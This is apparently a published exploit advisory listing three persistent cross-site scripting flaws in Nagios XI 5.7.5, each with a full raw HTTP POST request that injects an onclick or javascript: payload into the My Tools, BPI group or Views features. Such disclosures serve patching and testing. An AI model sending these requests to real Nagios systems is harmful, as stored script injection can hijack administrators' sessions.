@@ -1,0 +1,87 @@
+# Exploit Title: Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting
+# Date: 1-20-2021
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.nagios.com/products/nagios-xi/
+# Vendor Changelog: https://www.nagios.com/downloads/nagios-xi/change-log/
+# Software Link: https://www.nagios.com/downloads/nagios-xi/
+# Version: Nagios XI 5.7.5
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in the "My Tools" functionality of Nagios XI.
+# Vulnerable Parameter : url
+
+
+# POC
+# Exploit Details : The following request will create a tool with an XSS payload. Click on the URL link for the malicious tool to trigger the payload.
+
+POST /nagiosxi/tools/mytools.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/nagiosxi/tools/mytools.php?edit=1
+Cookie: nagiosxi=5kbmap730ic023ig2q0bpdefas
+Upgrade-Insecure-Requests: 1
+
+nsp=a2569a2507c7c69600769ca7388614b4264ab9479c560ac62bbc5f9fd76c2524&update=1&id=-1&name=XSS+Test&url=%27+onclick%3D%27alert%281%29&updateButton=
+
+
+############################################################################################################
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in "Business Process Intelligence" functionality of Nagios XI.
+# Vulnerable Parameter : groupID
+
+
+# POC
+# Exploit Details : The following request will create a BPI group with an XSS payload.  Click on the Group ID for the malicious BPI group to trigger the payload.
+
+POST /nagiosxi/includes/components/nagiosbpi/index.php?cmd=add HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 186
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/nagiosxi/includes/components/nagiosbpi/index.php?cmd=add&tab=add
+Cookie: nagiosxi=6lg3d4mqgsgsllclli1hch00td
+Upgrade-Insecure-Requests: 1
+
+groupID=%27onclick%3Dalert%281%29%2F%2F&groupType=default&groupTitle=TEST&groupDesc=&groupInfoUrl=&groupPrimary=1&groupWarn=90&groupCrit=80&groupDisplay=2&addSubmitted=true
+
+
+############################################################################################################
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in "Views" functionality of Nagios XI.
+# Vulnerable Parameter : url
+
+
+# POC
+# Exploit Details : The following request will create a view with an XSS payload.  Click on the malicious view to trigger the payload.
+
+POST /nagiosxi/ajaxhelper.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 147
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/nagiosxi/account/
+Cookie: nagiosxi=6lg3d4mqgsgsllclli1hch00td
+
+cmd=addview&url=javascript:alert(1)&title=TESTVIEW&submitButton=&nsp=c97136052a4b8d7d535c7d4a7a32389a5882c65cb34f2c36b849f72af52b2056
